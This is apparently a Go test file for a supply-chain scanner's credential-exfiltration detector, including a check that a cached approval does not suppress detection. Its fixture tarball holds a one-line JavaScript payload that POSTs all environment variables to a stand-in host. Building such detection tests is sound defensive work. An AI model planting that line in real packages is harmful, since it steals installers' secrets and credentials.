package predictive

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/alessandro-bitetto/chaindora/internal/findings"
	"github.com/alessandro-bitetto/chaindora/internal/gate"
	"github.com/alessandro-bitetto/chaindora/internal/inventory"
	"github.com/alessandro-bitetto/chaindora/internal/registries"
)

type artifactProbe struct {
	stubProbe
	data []byte
}

func (p artifactProbe) FetchTarball(_ context.Context, _ string, dst io.Writer) error {
	_, err := dst.Write(p.data)
	return err
}

func credentialArchive(t *testing.T) []byte {
	t.Helper()
	const source = `fetch("https://example.invalid/SECRET-CANARY", {method: "POST", body: JSON.stringify(process.env)})`
	var b bytes.Buffer
	gz := gzip.NewWriter(&b)
	tw := tar.NewWriter(gz)
	if err := tw.WriteHeader(&tar.Header{Name: "package/index.js", Size: int64(len(source)), Mode: 0o644}); err != nil {
		t.Fatal(err)
	}
	if _, err := io.WriteString(tw, source); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func TestCredentialDetectionWorksWithoutNewVersionDelta(t *testing.T) {
	// Both versions carry the same malicious shape. Version-diff alone
	// cannot detect this, and an old approval must not hide the new rule.
	now := time.Now()
	probe := artifactProbe{data: credentialArchive(t), stubProbe: stubProbe{
		publishedAt: map[string]time.Time{"1.0.0": now.AddDate(-2, 0, 0), "1.0.1": now.AddDate(-1, 0, 0)},
		publisher:   map[string]string{"1.0.0": "maintainer", "1.0.1": "maintainer"},
		versions: []registries.VersionInfo{
			{Version: "1.0.0", PublishedAt: now.AddDate(-2, 0, 0)},
			{Version: "1.0.1", PublishedAt: now.AddDate(-1, 0, 0)},
		},
	}}
	probes := gate.NewProbes()
	probes.Register("npm", probe)
	cache := gate.NewCache(t.TempDir(), 7*24*time.Hour)
	ref := gate.PackageRef{Ecosystem: "npm", Name: "fixture", Version: "1.0.1", Integrity: "sha512-A"}
	if err := cache.Store(ref, gate.PackageCheck{Results: []gate.CheckResult{{Checker: "version-diff", Verdict: gate.VerdictApprove}}}); err != nil {
		t.Fatal(err)
	}
	inv := &inventory.Inventory{Packages: []inventory.Package{{
		Ecosystem: inventory.EcosystemNPM, Name: ref.Name, Version: ref.Version,
		Integrity: ref.Integrity, SourcePath: "/project/package-lock.json",
	}}}
	out, err := New(probes, 72*time.Hour, cache).Detect(context.Background(), inv)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, f := range out {
		if f.Detector == "predictive:version-diff" {
			t.Fatal("fixture must have no signature delta")
		}
		if f.Detector != "predictive:credential-exfiltration" {
			continue
		}
		found = true
		if f.Severity != findings.SeverityHigh || f.Confidence != findings.ConfidenceMedium || f.Category != findings.CategoryPredictive {
			t.Fatalf("incorrect severity/confidence/category: %+v", f)
		}
		if !strings.Contains(f.Summary, "env-var-exfil-shape") || !strings.Contains(f.Summary, "index.js") || strings.Contains(f.Summary, "SECRET-CANARY") {
			t.Fatalf("missing or unredacted evidence: %+v", f)
		}
		if f.SourcePath != "/project/package-lock.json" {
			t.Fatal("finding lost inventory source")
		}
	}
	if !found {
		t.Fatalf("credential collection missed despite cached approval: %+v", out)
	}
}

func TestCredentialDetectionReportsIncompleteCoverage(t *testing.T) {
	probes := gate.NewProbes()
	probes.Register("pypi", artifactProbe{data: []byte("corrupt archive")})
	inv := &inventory.Inventory{Packages: []inventory.Package{{Ecosystem: inventory.EcosystemPyPI, Name: "fixture", Version: "1"}}}
	out, err := New(probes, 72*time.Hour, nil).Detect(context.Background(), inv)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range out {
		if f.Detector == "predictive:credential-exfiltration" {
			if f.Category != findings.CategoryConfiguration || f.Severity != findings.SeverityLow || !strings.Contains(f.Summary, "inspection incomplete") {
				t.Fatalf("incomplete scan is not malware evidence: %+v", f)
			}
			return
		}
	}
	t.Fatal("incomplete credential inspection was silently dropped")
}
